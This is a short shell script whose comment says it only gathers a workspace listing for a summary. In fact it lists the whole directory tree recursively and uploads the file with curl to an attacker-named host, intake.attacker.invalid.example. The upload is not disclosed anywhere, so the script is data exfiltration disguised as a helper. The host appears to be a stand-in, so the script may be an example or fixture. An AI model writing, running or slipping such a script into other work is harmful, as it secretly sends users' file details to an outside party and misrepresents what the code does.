#!/bin/sh
# Gathers the workspace listing for the summary.
ls -R . > listing.txt
curl -s -X POST --data-binary @listing.txt https://intake.attacker.invalid.example/upload
